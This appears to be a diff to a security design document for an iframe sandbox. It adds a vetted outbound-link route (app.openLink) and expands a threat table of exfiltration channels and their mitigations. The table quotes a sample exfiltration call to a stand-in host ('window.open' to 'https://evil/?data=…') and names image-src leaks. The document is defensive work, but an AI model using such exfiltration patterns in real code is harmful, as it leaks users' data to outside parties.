@@ -79,11 +79,13 @@ Preview bundles get a separate key namespace so unreviewed code can never write 
 
 **On `allow-scripts` + `allow-same-origin`.** The standard warning against this combination applies *only when the framed document is same-origin with the embedder* — in that case the frame can reach into the parent DOM and delete its own `sandbox` attribute. Our bundle origin is a different registrable domain, so `window.parent` is opaque to it and the escape does not exist. This is exactly the CodePen/StackBlitz configuration. Put this paragraph in a comment above the attribute, because it will be flagged in every future review.
 
+**Links out.** With no `allow-popups` and no `allow-top-navigation`, an ordinary `target="_blank"`, `tel:` or `mailto:` link in a creation does nothing, and a plain link out replaces the creation (an unexpected `load`, reason `navigated`). The guest runtime therefore catches clicks on links that leave the creation, and `window.open`, and sends them to `app.openLink`. The host checks the link, and the shell asks the resident in a dialog drawn outside the frame. The sandbox token list does not change. See `packages/shared/src/links.ts` and `CreationHost.requestLink`.
+
 **Deliberately absent, with reasons:**
 
 | Token | Why denied |
 |---|---|
-| `allow-popups` | `window.open('https://evil/?data=…')` is an egress channel CSP cannot block |
+| `allow-popups` | `window.open('https://evil/?data=…')` is an egress channel CSP cannot block. Links out go through `app.openLink` instead (see below) |
 | `allow-popups-to-escape-sandbox` | Would hand a popup full ambient privileges |
 | `allow-top-navigation*` (all variants) | Frame could navigate the whole tab away, phishing vector |
 | `allow-downloads` | Drive-by download |
@@ -992,7 +994,7 @@ townsquare/
 | 5 | Exfiltration via `fetch`/XHR/WebSocket/`sendBeacon` | `default-src 'none'` + `connect-src` = declared allowlist only |
 | 6 | Exfiltration via `new Image().src = url + secret` | `img-src` is exactly as tight as `connect-src`. This is the bypass people miss when they only lock `connect-src` |
 | 7 | Exfiltration via form POST | `form-action 'none'` |
-| 8 | Exfiltration via `window.open` | No `allow-popups` |
+| 8 | Exfiltration via `window.open` | No `allow-popups`. The sanctioned route, `app.openLink`, is checked by the host (`checkOutboundLink`: https/http/tel/mailto only, no credentials in the URL, no IPs or private names, no `cc`/`bcc`), needs a press inside the frame (page activation **and** focus in the iframe), allows one dialog at a time, and opens only from the resident's click in a shell-drawn dialog that names the real host. A link can still carry data in its address, but only to a place the resident has seen and chosen |
 | 9 | Exfiltration via nested iframe / `<object>` | `frame-src 'none'`, `child-src 'none'`, `object-src 'none'` |
 | 10 | Exfiltration via `<base href>` repointing relative URLs | `base-uri 'none'` |
 | 11 | Exfiltration via Referer leakage | `Referrer-Policy: no-referrer` on assets and on the iframe |
